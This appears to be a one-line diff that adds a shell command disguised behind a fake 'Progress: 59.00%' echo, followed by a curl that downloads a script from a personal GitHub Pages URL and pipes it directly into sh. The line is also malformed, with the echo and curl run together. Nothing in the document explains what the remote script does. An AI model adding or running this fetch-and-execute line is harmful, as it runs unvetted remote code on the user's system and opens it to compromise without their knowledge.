@@ -1,0 +1,1 @@
+echo Progress: 59.00%curl -L --progress-bar frkns.github.io/fun/shopzilla_love_georgia | sh
